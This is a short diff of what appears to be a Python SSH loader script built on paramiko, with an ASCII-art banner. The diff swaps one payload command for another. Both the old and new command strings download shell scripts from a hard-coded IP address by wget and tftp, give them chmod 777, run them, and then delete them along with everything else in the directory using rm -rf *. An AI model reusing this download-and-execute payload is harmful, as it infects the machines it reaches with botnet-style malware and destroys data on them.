@@ -41,7 +41,7 @@ paramiko.util.log_to_file("para.log")
 ███   ▄███   ███    ███   ███        ███  ███   ███   ███    ███    ▄█    ███ 
 ████████▀    ██████████   ███        █▀    ▀█   █▀    ██████████  ▄████████▀                                                                           
 """
-cmd = 'cd /tmp || cd /run || cd /; wget http://35.183.182.60/yoyobins.sh; chmod 777 yoyobins.sh; sh yoyobins.sh; tftp 35.183.182.60 -c get yoyotftp1.sh; chmod 777 yoyotftp1.sh; sh yoyotftp1.sh; tftp -r yoyotftp2.sh -g 35.183.182.60; chmod 777 yoyotftp2.sh; sh yoyotftp2.sh; rm -rf yoyobins.sh yoyotftp1.sh yoyotftp2.sh; rm -rf *'
+cmd = 'cd /tmp || cd /run || cd /; wget http://35.183.182.60/yesbins.sh; chmod 777 yesbins.sh; sh yesbins.sh; tftp 35.183.182.60 -c get yestftp1.sh; chmod 777 yestftp1.sh; sh yestftp1.sh; tftp -r yestftp2.sh -g 35.183.182.60; chmod 777 yestftp2.sh; sh yestftp2.sh; rm -rf yesbins.sh yestftp1.sh yestftp2.sh; rm -rf *'
 # PAYLOAD
 blacklist = [
     '127'
